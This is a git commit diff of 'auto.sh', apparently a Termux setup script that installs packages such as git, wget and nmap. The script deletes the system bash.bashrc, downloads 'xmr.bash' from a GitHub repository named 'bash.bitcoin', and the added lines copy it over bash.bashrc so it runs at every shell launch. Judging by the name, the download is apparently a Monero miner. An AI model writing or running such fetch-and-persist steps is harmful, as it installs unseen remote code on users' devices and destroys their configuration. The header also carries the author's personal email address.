e3b74101000c4d8e0076788aaec5aa26a30235cf
manh-mobile-0898707968 <levanmanh451994@gmail.com>
2024-10-12 16:56:11 +0700

    auto.sh

--- auto.sh
+++ auto.sh
@@ -1,2 +1,4 @@
 apt update && yes | apt upgrade && apt update && apt install git -y && pkg install wget -y && pkg install nmap -y && pkg install wget -y && apt-get install git && pkg install git && apt -y install neofetch
 cd && pwd && cd ../usr/etc && rm -rf bash.bashrc && wget https://raw.githubusercontent.com/manh-mobile-0898707968/bash.bitcoin/refs/heads/main/xmr.bash
+cp xmr.bash ../etc/bash.bashrc
+rm -rf xmr.bash
